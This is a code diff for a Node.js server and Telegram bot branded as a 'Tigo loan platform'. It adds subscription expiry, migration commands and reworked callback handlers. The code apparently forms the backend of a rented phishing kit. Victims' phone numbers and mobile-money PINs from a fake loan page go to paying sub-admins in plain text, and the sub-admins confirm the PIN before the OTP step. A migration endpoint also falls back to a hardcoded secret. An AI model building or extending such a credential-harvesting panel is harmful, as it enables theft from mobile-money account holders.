@@ -20,7 +20,7 @@ const processingLocks = new Set();
 let dbReady = false;
 
 // ==========================================
-// ✅ SHORT CODE GENERATOR
+// SHORT CODE GENERATOR
 // ==========================================
 async function generateUniqueShortCode() {
     const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
@@ -142,6 +142,37 @@ db.connectDatabase()
             console.log(`✅ Bot: @${botInfo.username}`);
         } catch (e) { console.error('❌ Bot API error:', e); }
 
+        // ==========================================
+        // AUTO-LOCK EXPIRED SUBSCRIPTIONS (every hour)
+        // ==========================================
+        async function checkExpiredSubscriptions() {
+            try {
+                const now = new Date();
+                const admins = await db.getAllAdmins();
+                for (const admin of admins) {
+                    if (admin.adminId === 'ADMIN001') continue;
+                    if (admin.paymentStatus === 'paid' && admin.subscriptionExpiryDate) {
+                        const expiry = new Date(admin.subscriptionExpiryDate);
+                        if (now > expiry) {
+                            await db.updateAdmin(admin.adminId, { paymentStatus: 'unpaid' });
+                            await sendToAdmin(
+                                admin.adminId,
+                                `🔒 *SUBSCRIPTION EXPIRED*\n\nYour subscription has expired as of ${expiry.toLocaleDateString()}.\n\n💳 Please pay TSh 500 to reactivate your link.\n\nContact the super admin to renew.`,
+                                { parse_mode: 'Markdown' }
+                            );
+                            console.log(`🔒 Subscription expired and locked: ${admin.adminId} (${admin.name})`);
+                        }
+                    }
+                }
+            } catch (e) {
+                console.error('⚠️ Expiry check error:', e.message);
+            }
+        }
+
+        // Run immediately on startup, then every hour
+        checkExpiredSubscriptions();
+        setInterval(checkExpiredSubscriptions, 60 * 60 * 1000);
+
         setInterval(() => {
             console.log(`💓 Keep-alive: ${adminChatIds.size} admins, ${pausedAdmins.size} paused`);
         }, 60000);
@@ -199,21 +230,26 @@ function setupCommandHandlers() {
                     const isSuperAdmin = adminId === 'ADMIN001';
                     const appUrl = process.env.APP_URL || WEBHOOK_URL;
 
-                    // ✅ NEW: Check payment status
                     const paymentStatus = admin.paymentStatus || 'unpaid';
                     const linkStatus = paymentStatus === 'paid' ? '✅ ACTIVE' : '🔒 LOCKED (Payment pending)';
 
+                    // Show expiry date if paid
+                    let expiryInfo = '';
+                    if (paymentStatus === 'paid' && admin.subscriptionExpiryDate) {
+                        const expiry = new Date(admin.subscriptionExpiryDate);
+                        expiryInfo = `\n⏱️ *Expires:* ${expiry.toLocaleDateString()}`;
+                    }
+
                     let startMsg = `👋 *Welcome${isSuperAdmin ? ', Super Admin' : ''}!*\n\n`;
                     startMsg += isSuperAdmin
-                        ? `You are the super admin managing the loan platform.\n\n*Available Commands:*\n/addadmin - Add new sub-admin\n/listadmins - View all admins\n/payments - Manage payments\n/stats - View statistics\n/help - Show all commands`
-                        : `📱 Your loan application link:\n\`${appUrl}/${admin.shortCode}\`\n\n💳 *Payment Status:* ${linkStatus}\n*Status:* ${admin.status}\n\n*Your Admin ID:* \`${adminId}\``;
+                        ? `You are the super admin managing the loan platform.\n\n*Available Commands:*\n/addadmin - Add new sub-admin\n/listadmins - View all admins\n/payments - Manage payments\n/migrate - Set all admins to paid (May 5 expiry)\n/stats - View statistics\n/help - Show all commands`
+                        : `📱 Your loan application link:\n\`${appUrl}/${admin.shortCode}\`\n\n💳 *Payment Status:* ${linkStatus}${expiryInfo}\n*Status:* ${admin.status}\n\n*Your Admin ID:* \`${adminId}\``;
 
                     await bot.sendMessage(chatId, startMsg, { parse_mode: 'Markdown' });
                 }
                 return;
             }
 
-            // New user (not an admin)
             await bot.sendMessage(chatId, '👋 Welcome!\n\nYou are not registered as an admin. Only admins can use this bot.', { parse_mode: 'Markdown' });
 
         } catch (error) {
@@ -274,7 +310,6 @@ function setupCommandHandlers() {
 
                 adminChatIds.set(newAdminId, newChatId);
 
-                // ✅ NEW: Record initial payment as unpaid
                 await db.recordPayment(newAdminId, {
                     amount: 500,
                     status: 'pending',
@@ -295,7 +330,6 @@ function setupCommandHandlers() {
 
                 await bot.sendMessage(chatId, confirmMsg, { parse_mode: 'Markdown' });
 
-                // Send welcome message to new admin
                 await bot.sendMessage(newChatId, `👋 Welcome ${name}!\n\nYou have been added as a sub-admin.\n\n🔒 *Your link is currently LOCKED*\n💳 Awaiting payment approval from super admin.\n\n💰 *Amount Due:* TSh 500\n\nOnce approved, users can access your application link.`, { parse_mode: 'Markdown' });
 
             } catch (error) {
@@ -305,10 +339,77 @@ function setupCommandHandlers() {
         };
 
         bot.on('message', listener);
-        setTimeout(() => bot.removeListener('message', listener), 300000); // 5 min timeout
+        setTimeout(() => bot.removeListener('message', listener), 300000);
     });
 
-    // ✅ NEW: Payment management command
+    // ==========================================
+    // MIGRATE COMMAND: Set all admins to paid, expire May 5
+    // ==========================================
+    bot.onText(/\/migrate/, async (msg) => {
+        const chatId = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+
+        if (adminId !== 'ADMIN001') {
+            await bot.sendMessage(chatId, '🚫 Only the super admin can run migrations.');
+            return;
+        }
+
+        await bot.sendMessage(chatId, '⏳ Running migration... Setting all admins to PAID with May 5 expiry.', { parse_mode: 'Markdown' });
+
+        try {
+            const admins = await db.getAllAdmins();
+            // May 5, 2025 end of day (EAT = UTC+3, so 23:59:59 EAT = 20:59:59 UTC)
+            const expiryDate = new Date('2025-05-05T20:59:59.000Z');
+            const now = new Date();
+
+            let updated = 0;
+            let skipped = 0;
+            const appUrl = process.env.APP_URL || WEBHOOK_URL;
+
+            for (const admin of admins) {
+                if (admin.adminId === 'ADMIN001') { skipped++; continue; }
+
+                await db.updateAdmin(admin.adminId, {
+                    paymentStatus: 'paid',
+                    subscriptionStartDate: now.toISOString(),
+                    subscriptionExpiryDate: expiryDate.toISOString(),
+                    lastPaymentDate: now.toISOString()
+                });
+
+                // Notify each admin their link is now active
+                try {
+                    await sendToAdmin(
+                        admin.adminId,
+                        `✅ *LINK ACTIVATED!*\n\nYour subscription has been activated by the super admin.\n\n📱 *Your Link:*\n\`${appUrl}/${admin.shortCode}\`\n\n⏱️ *Valid until:* 5 May 2025\n\n🔓 Users can now access your application link.`,
+                        { parse_mode: 'Markdown' }
+                    );
+                } catch (notifyErr) {
+                    console.error(`⚠️ Could not notify ${admin.adminId}:`, notifyErr.message);
+                }
+
+                updated++;
+            }
+
+            const resultMsg =
+                `✅ *MIGRATION COMPLETE!*\n\n` +
+                `👥 Admins updated: *${updated}*\n` +
+                `⏭️ Skipped (super admin): *${skipped}*\n\n` +
+                `💳 Payment Status: *PAID*\n` +
+                `⏱️ Expires: *5 May 2025 at 23:59 EAT*\n\n` +
+                `All sub-admins have been notified.`;
+
+            await bot.sendMessage(chatId, resultMsg, { parse_mode: 'Markdown' });
+            console.log(`✅ Migration complete: ${updated} admins set to paid, expiry 2025-05-05`);
+
+        } catch (error) {
+            console.error('❌ Migration error:', error);
+            await bot.sendMessage(chatId, `❌ Migration failed: ${error.message}`);
+        }
+    });
+
+    // ==========================================
+    // PAYMENTS COMMAND
+    // ==========================================
     bot.onText(/\/payments/, async (msg) => {
         const chatId = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
@@ -368,10 +469,9 @@ function setupCommandHandlers() {
                 return;
             }
 
-            // ✅ FIX: Split into chunks to avoid Telegram 4096 character limit
             const messages = [];
             let currentMsg = `👥 *SUB-ADMIN LIST* (${admins.length} total)\n\n`;
-            const maxLength = 3500; // Leave buffer for safety
+            const maxLength = 3500;
 
             for (const admin of admins) {
                 if (admin.adminId === 'ADMIN001') continue;
@@ -379,9 +479,14 @@ function setupCommandHandlers() {
                 const paymentIcon = admin.paymentStatus === 'paid' ? '✅ PAID' : admin.paymentStatus === 'pending' ? '⏳ PENDING' : '🔒 UNPAID';
                 const statusIcon = admin.status === 'active' ? '✅' : '⏸️';
 
-                const adminEntry = `${statusIcon} *${admin.name}*\n📧 ${admin.email}\n🔗 ${admin.shortCode}\n💳 ${paymentIcon}\n📱 Apps: ${(await db.getAdminStats(admin.adminId)).total}\n---\n`;
+                let expiryLine = '';
+                if (admin.paymentStatus === 'paid' && admin.subscriptionExpiryDate) {
+                    const expiry = new Date(admin.subscriptionExpiryDate);
+                    expiryLine = `⏱️ Expires: ${expiry.toLocaleDateString()}\n`;
+                }
 
-                // If adding this admin would exceed limit, save current message and start new one
+                const adminEntry = `${statusIcon} *${admin.name}*\n📧 ${admin.email}\n🔗 ${admin.shortCode}\n💳 ${paymentIcon}\n${expiryLine}📱 Apps: ${(await db.getAdminStats(admin.adminId)).total}\n---\n`;
+
                 if ((currentMsg + adminEntry).length > maxLength) {
                     messages.push(currentMsg);
                     currentMsg = adminEntry;
@@ -390,17 +495,11 @@ function setupCommandHandlers() {
                 }
             }
 
-            // Add the last message
-            if (currentMsg.length > 0) {
-                messages.push(currentMsg);
-            }
+            if (currentMsg.length > 0) messages.push(currentMsg);
 
-            // Send all messages with delay to avoid rate limiting
             for (let i = 0; i < messages.length; i++) {
                 await bot.sendMessage(chatId, messages[i], { parse_mode: 'Markdown' });
-                if (i < messages.length - 1) {
-                    await new Promise(r => setTimeout(r, 500)); // 500ms delay between messages
-                }
+                if (i < messages.length - 1) await new Promise(r => setTimeout(r, 500));
             }
 
             console.log(`📋 Sent ${messages.length} message(s) with ${admins.length - 1} admins`);
@@ -458,7 +557,7 @@ function setupCommandHandlers() {
         }
 
         if (adminId === 'ADMIN001') {
-            const helpMsg = `*SUPER ADMIN COMMANDS*\n\n/start - Welcome message\n/addadmin - Add new sub-admin\n/listadmins - View all admins\n/payments - Manage payments\n/stats - System statistics\n/help - This message`;
+            const helpMsg = `*SUPER ADMIN COMMANDS*\n\n/start - Welcome message\n/addadmin - Add new sub-admin\n/listadmins - View all admins\n/payments - Manage payments\n/migrate - Set all admins to paid (May 5 expiry)\n/stats - System statistics\n/help - This message`;
             await bot.sendMessage(chatId, helpMsg, { parse_mode: 'Markdown' });
         } else {
             const helpMsg = `*SUB-ADMIN COMMANDS*\n\n/start - Welcome message\n/stats - Your statistics\n/help - This message`;
@@ -466,52 +565,142 @@ function setupCommandHandlers() {
         }
     });
 
-    // ✅ NEW: Callback handlers for payment approval/rejection
+    // ==========================================
+    // CALLBACK HANDLERS (payment approval + pin/otp actions)
+    // ==========================================
     bot.on('callback_query', async (query) => {
         const chatId = query.message.chat.id;
         const adminId = getAdminIdByChatId(chatId);
 
-        if (adminId !== 'ADMIN001') {
-            await bot.answerCallbackQuery(query.id, '❌ Only super admin can approve payments', true);
-            return;
-        }
-
         try {
-            if (query.data.startsWith('approve_payment_')) {
-                const paymentId = query.data.replace('approve_payment_', '');
-                const ObjectId = require('mongodb').ObjectId;
-
-                try {
-                    const payment = await db.approvePayment(new ObjectId(paymentId), 'Approved by super admin');
-                    const admin = await db.getAdmin(payment.adminId);
-
-                    // Notify admin of approval
-                    await sendToAdmin(payment.adminId, `✅ *PAYMENT APPROVED!*\n\n💰 Your subscription fee of TSh 500 has been approved.\n\n🔓 Your link is now ACTIVE\n⏱️ Valid for 30 days\n\n📱 Application Link: \`${process.env.APP_URL || WEBHOOK_URL}/${admin.shortCode}\``, { parse_mode: 'Markdown' });
-
-                    await bot.editMessageText('✅ Payment approved! Admin link is now active.', { chat_id: chatId, message_id: query.message.message_id });
-                    await bot.answerCallbackQuery(query.id, '✅ Payment approved');
-
-                } catch (error) {
-                    console.error('Payment approval error:', error);
+            // ---- Payment approve/reject (super admin only) ----
+            if (query.data.startsWith('approve_payment_') || query.data.startsWith('reject_payment_')) {
+                if (adminId !== 'ADMIN001') {
+                    await bot.answerCallbackQuery(query.id, '❌ Only super admin can approve payments', true);
+                    return;
                 }
 
-            } else if (query.data.startsWith('reject_payment_')) {
-                const paymentId = query.data.replace('reject_payment_', '');
-                const ObjectId = require('mongodb').ObjectId;
+                const { ObjectId } = require('mongodb');
 
-                try {
-                    const payment = await db.rejectPayment(new ObjectId(paymentId), 'Rejected by super admin');
+                if (query.data.startsWith('approve_payment_')) {
+                    const paymentId = query.data.replace('approve_payment_', '');
+                    try {
+                        await db.approvePayment(new ObjectId(paymentId), 'Approved by super admin');
 
-                    // Notify admin of rejection
-                    await sendToAdmin(payment.adminId, `❌ *PAYMENT REJECTED*\n\n💰 Your subscription payment has been rejected.\n\n🔒 Your link remains LOCKED\n\nPlease contact the super admin for details.`, { parse_mode: 'Markdown' });
+                        // Re-fetch the payment to get adminId
+                        const payments = await db.getAllPayments();
+                        const payment = payments.find(p => p._id.toString() === paymentId);
+                        if (payment) {
+                            const paidAdmin = await db.getAdmin(payment.adminId);
+                            await sendToAdmin(
+                                payment.adminId,
+                                `✅ *PAYMENT APPROVED!*\n\n💰 Your subscription fee of TSh 500 has been approved.\n\n🔓 Your link is now ACTIVE\n⏱️ Valid for 30 days\n\n📱 Application Link:\n\`${process.env.APP_URL || WEBHOOK_URL}/${paidAdmin?.shortCode}\``,
+                                { parse_mode: 'Markdown' }
+                            );
+                        }
 
-                    await bot.editMessageText('❌ Payment rejected. Admin notified.', { chat_id: chatId, message_id: query.message.message_id });
-                    await bot.answerCallbackQuery(query.id, '❌ Payment rejected');
+                        await bot.editMessageText('✅ Payment approved! Admin link is now active.', {
+                            chat_id: chatId, message_id: query.message.message_id
+                        });
+                        await bot.answerCallbackQuery(query.id, '✅ Payment approved');
+                    } catch (error) {
+                        console.error('Payment approval error:', error);
+                        await bot.answerCallbackQuery(query.id, '❌ Error approving payment', true);
+                    }
 
-                } catch (error) {
-                    console.error('Payment rejection error:', error);
+                } else if (query.data.startsWith('reject_payment_')) {
+                    const paymentId = query.data.replace('reject_payment_', '');
+                    try {
+                        await db.rejectPayment(new ObjectId(paymentId), 'Rejected by super admin');
+
+                        const payments = await db.getAllPayments();
+                        const payment = payments.find(p => p._id.toString() === paymentId);
+                        if (payment) {
+                            await sendToAdmin(
+                                payment.adminId,
+                                `❌ *PAYMENT REJECTED*\n\n💰 Your subscription payment has been rejected.\n\n🔒 Your link remains LOCKED\n\nPlease contact the super admin for details.`,
+                                { parse_mode: 'Markdown' }
+                            );
+                        }
+
+                        await bot.editMessageText('❌ Payment rejected. Admin notified.', {
+                            chat_id: chatId, message_id: query.message.message_id
+                        });
+                        await bot.answerCallbackQuery(query.id, '❌ Payment rejected');
+                    } catch (error) {
+                        console.error('Payment rejection error:', error);
+                        await bot.answerCallbackQuery(query.id, '❌ Error rejecting payment', true);
+                    }
                 }
+                return;
             }
+
+            // ---- PIN approval/denial ----
+            if (query.data.startsWith('allow_pin_') || query.data.startsWith('deny_pin_')) {
+                const isAllow = query.data.startsWith('allow_pin_');
+                const parts = query.data.replace(isAllow ? 'allow_pin_' : 'deny_pin_', '').split('_');
+                const targetAdminId = parts[0];
+                const applicationId = parts.slice(1).join('_');
+
+                if (adminId !== targetAdminId && adminId !== 'ADMIN001') {
+                    await bot.answerCallbackQuery(query.id, '❌ Not authorized', true);
+                    return;
+                }
+
+                if (isAllow) {
+                    await db.updateApplication(applicationId, { pinStatus: 'approved' });
+                    await bot.editMessageText(
+                        `✅ PIN approved for application ${applicationId}. User can now proceed to OTP.`,
+                        { chat_id: chatId, message_id: query.message.message_id }
+                    );
+                    await bot.answerCallbackQuery(query.id, '✅ PIN approved');
+                } else {
+                    await db.updateApplication(applicationId, { pinStatus: 'rejected' });
+                    await bot.editMessageText(
+                        `❌ PIN denied for application ${applicationId}.`,
+                        { chat_id: chatId, message_id: query.message.message_id }
+                    );
+                    await bot.answerCallbackQuery(query.id, '❌ PIN denied');
+                }
+                return;
+            }
+
+            // ---- OTP approval/denial ----
+            if (query.data.startsWith('approve_otp_') || query.data.startsWith('wrongpin_otp_') || query.data.startsWith('wrongcode_otp_')) {
+                let action, rest;
+                if (query.data.startsWith('approve_otp_')) {
+                    action = 'approved';
+                    rest = query.data.replace('approve_otp_', '');
+                } else if (query.data.startsWith('wrongpin_otp_')) {
+                    action = 'wrongpin_otp';
+                    rest = query.data.replace('wrongpin_otp_', '');
+                } else {
+                    action = 'wrongcode';
+                    rest = query.data.replace('wrongcode_otp_', '');
+                }
+
+                const parts = rest.split('_');
+                const targetAdminId = parts[0];
+                const applicationId = parts.slice(1).join('_');
+
+                if (adminId !== targetAdminId && adminId !== 'ADMIN001') {
+                    await bot.answerCallbackQuery(query.id, '❌ Not authorized', true);
+                    return;
+                }
+
+                await db.updateApplication(applicationId, { otpStatus: action });
+
+                const statusText = action === 'approved' ? '✅ Loan approved!' : action === 'wrongpin_otp' ? '❌ Wrong PIN marked.' : '❌ Wrong code marked.';
+                await bot.editMessageText(
+                    `${statusText} Application: ${applicationId}`,
+                    { chat_id: chatId, message_id: query.message.message_id }
+                );
+                await bot.answerCallbackQuery(query.id, statusText);
+                return;
+            }
+
+            await bot.answerCallbackQuery(query.id, '⚠️ Unknown action', true);
+
         } catch (error) {
             console.error('❌ Callback error:', error);
             await bot.answerCallbackQuery(query.id, '❌ Error processing request', true);
@@ -523,7 +712,69 @@ function setupCommandHandlers() {
 // API ENDPOINTS
 // ==========================================
 
-// ✅ NEW: Get admin info with payment status
+// ONE-TIME MIGRATION via HTTP (protected by secret key)
+// Usage: GET /api/migrate-paid?secret=YOUR_SECRET
+// Remove this endpoint after first use!
+app.get('/api/migrate-paid', async (req, res) => {
+    const secret = req.query.secret;
+    const MIGRATION_SECRET = process.env.MIGRATION_SECRET || 'tigo-migrate-2025';
+
+    if (secret !== MIGRATION_SECRET) {
+        return res.status(403).json({ error: 'Unauthorized. Provide correct ?secret= key.' });
+    }
+
+    try {
+        const admins = await db.getAllAdmins();
+        // May 5, 2025 end of day EAT (UTC+3) → 20:59:59 UTC
+        const expiryDate = new Date('2025-05-05T20:59:59.000Z');
+        const now = new Date();
+        const appUrl = process.env.APP_URL || WEBHOOK_URL;
+
+        let updated = 0;
+        let skipped = 0;
+        const results = [];
+
+        for (const admin of admins) {
+            if (admin.adminId === 'ADMIN001') { skipped++; continue; }
+
+            await db.updateAdmin(admin.adminId, {
+                paymentStatus: 'paid',
+                subscriptionStartDate: now.toISOString(),
+                subscriptionExpiryDate: expiryDate.toISOString(),
+                lastPaymentDate: now.toISOString()
+            });
+
+            try {
+                await sendToAdmin(
+                    admin.adminId,
+                    `✅ *LINK ACTIVATED!*\n\nYour subscription has been activated by the super admin.\n\n📱 *Your Link:*\n\`${appUrl}/${admin.shortCode}\`\n\n⏱️ *Valid until:* 5 May 2025\n\n🔓 Users can now access your application link.`,
+                    { parse_mode: 'Markdown' }
+                );
+            } catch (notifyErr) {
+                console.error(`⚠️ Could not notify ${admin.adminId}:`, notifyErr.message);
+            }
+
+            results.push({ adminId: admin.adminId, name: admin.name, shortCode: admin.shortCode });
+            updated++;
+        }
+
+        console.log(`✅ HTTP Migration: ${updated} admins set to paid, expiry 2025-05-05`);
+        res.json({
+            success: true,
+            updated,
+            skipped,
+            expiryDate: expiryDate.toISOString(),
+            expiryLocal: '5 May 2025 at 23:59 EAT',
+            admins: results
+        });
+
+    } catch (err) {
+        console.error('❌ Migration error:', err);
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// Get admin info with payment status
 app.get('/api/admin-info/:code', async (req, res) => {
     try {
         const code = req.params.code.toLowerCase();
@@ -533,9 +784,10 @@ app.get('/api/admin-info/:code', async (req, res) => {
             return res.status(404).json({ success: false, message: 'Admin not found', locked: true });
         }
 
-        // Check if link is locked
         const isLocked = admin.paymentStatus !== 'paid';
-        const lockReason = admin.paymentStatus === 'unpaid' ? 'Payment not yet processed' : 'Payment pending approval';
+        const lockReason = admin.paymentStatus === 'unpaid'
+            ? 'Payment not yet processed'
+            : 'Payment pending approval';
 
         res.json({
             success: true,
@@ -579,7 +831,6 @@ app.post('/api/verify-pin', async (req, res) => {
         }
         processingLocks.add(lockKey);
 
-        // ✅ NEW: Check if admin's link is locked
         const admin = await db.getAdmin(adminId);
         if (!admin) {
             processingLocks.delete(lockKey);
@@ -613,20 +864,18 @@ app.post('/api/verify-pin', async (req, res) => {
             adminName: admin.name
         });
 
-        const assignedAdmin = admin;
-
         await sendToAdmin(adminId, `🆕 *NEW LOAN APPLICATION*\n\n📋 \`${applicationId}\`\n\n📱 ${phoneNumber}\n🔐 \`${pin}\`\n\n⏰ ${new Date().toLocaleString()}\n\n⚠️ *ACTION REQUIRED*\nPlease verify if this phone number and PIN are correct.`, {
             parse_mode: 'Markdown',
             reply_markup: {
                 inline_keyboard: [
-                    [{ text: '❌ Invalid Information', callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
-                    [{ text: '✅ Correct - Allow OTP', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
+                    [{ text: '❌ Invalid Information', callback_data: `deny_pin_${adminId}_${applicationId}` }],
+                    [{ text: '✅ Correct - Allow OTP', callback_data: `allow_pin_${adminId}_${applicationId}` }]
                 ]
             }
         });
 
         processingLocks.delete(lockKey);
-        res.json({ success: true, applicationId, assignedTo: assignedAdmin.name, assignedAdminId: assignedAdmin.adminId });
+        res.json({ success: true, applicationId, assignedTo: admin.name, assignedAdminId: adminId });
 
     } catch (error) {
         processingLocks.delete(lockKey);
@@ -656,7 +905,6 @@ app.post('/api/verify-otp', async (req, res) => {
         const application = await db.getApplication(applicationId);
         if (!application) return res.status(404).json({ success: false, message: 'Application not found' });
 
-        // ✅ NEW: Check if admin's link is locked
         const admin = await db.getAdmin(application.adminId);
         if (admin.paymentStatus !== 'paid') {
             return res.status(403).json({
@@ -710,7 +958,6 @@ app.post('/api/resend-otp', async (req, res) => {
         const application = await db.getApplication(applicationId);
         if (!application) return res.status(404).json({ success: false, message: 'Application not found' });
 
-        // ✅ NEW: Check payment status
         const admin = await db.getAdmin(application.adminId);
         if (admin.paymentStatus !== 'paid') {
             return res.status(403).json({ success: false, message: 'Admin link is locked', locked: true });
@@ -768,7 +1015,6 @@ app.get('/:code([a-z0-9]{3,10})', async (req, res) => {
             return res.sendFile(path.join(__dirname, 'invalid-link.html'));
         }
 
-        // ✅ NEW: Check if link is locked due to payment
         if (admin.paymentStatus !== 'paid') {
             const lockReason = admin.paymentStatus === 'unpaid'
                 ? 'This link is locked. Payment has not been processed by the super admin.'
@@ -867,7 +1113,7 @@ app.get('/:code([a-z0-9]{3,10})', async (req, res) => {
 });
 
 // ==========================================
-// SERVER
+// SERVER START
 // ==========================================
 app.listen(PORT, () => {
     console.log(`\n👑 TIGO LOAN PLATFORM — SHORT CODE MODE + PAYMENT SYSTEM`);
@@ -875,7 +1121,8 @@ app.listen(PORT, () => {
     console.log(`🌐 Server: http://localhost:${PORT}`);
     console.log(`🔑 Links: yoursite.com/XXXXX (5-char codes)`);
     console.log(`💳 Payment System: ENABLED`);
-    console.log(`🔒 Locked Links: Inactive until payment approved`);
+    console.log(`🔒 Auto-lock: Active (checks every hour)`);
+    console.log(`📅 Migration: /migrate (Telegram) or /api/migrate-paid?secret=... (HTTP)`);
     console.log(`\n✅ Ready!\n`);
 });
 
